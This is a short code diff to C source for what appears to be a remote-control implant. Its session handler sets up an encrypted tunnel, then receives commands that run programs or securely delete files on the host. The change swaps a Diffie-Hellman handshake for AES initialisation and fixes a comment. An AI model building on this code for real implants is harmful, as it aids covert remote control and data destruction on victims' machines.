@@ -83,7 +83,7 @@ int write_all( int fd, void *ptr, int n )
 }
 
 //******************************************************************
-//Waits for data to arrive on the socket and reads it in untill the buffer is full.
+//Waits for data to arrive on the socket and reads it in until the buffer is full.
 int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
 {
 	unsigned long		receivedTotal = 0;
@@ -428,7 +428,6 @@ unsigned long StartClientSession( int sock )
 	int fQuit = 0;
 	int retval = 0;
 	char* commandpath = 0;
-	dhm_context *tunnelDhm;
 
 	DL(2);
 	// we have an established TCP/IP connection
@@ -451,11 +450,9 @@ unsigned long StartClientSession( int sock )
 	}
 	DLX(3, printf("TLS handshake complete.\n"));
 
-	//Tunnel Dhm 
-	DLX(4, printf( "Beginning to do tunnel Diffie Hellman Handshake.\n"));
-	if ((tunnelDhm= dhHandshake( &trig_ssl )) == NULL)
-	{
-		DLX(4, printf("Diffie Hellman Handshakefailed\n"));
+	// Create AES Tunnel
+	if (aes_init(&trig_ssl) == 0) {
+		DLX(4, printf("aes_init() failed\n"));
 		goto Exit;
 	}
 
@@ -517,7 +514,6 @@ unsigned long StartClientSession( int sock )
 					ret.reply = Execute( commandpath );
 					break;
 
-
 				case DELETE:
 					DLX(2, printf("DELETE command received, attempting SECURE DELETE...\n"));
 						ret.reply = SecureDelete(commandpath);
@@ -574,6 +570,7 @@ unsigned long StartClientSession( int sock )
 Exit:
 		if( commandpath != 0 ) free( commandpath );
 		crypt_cleanup( &trig_ssl);
+		aes_terminate();
 
 		return retval;
 }
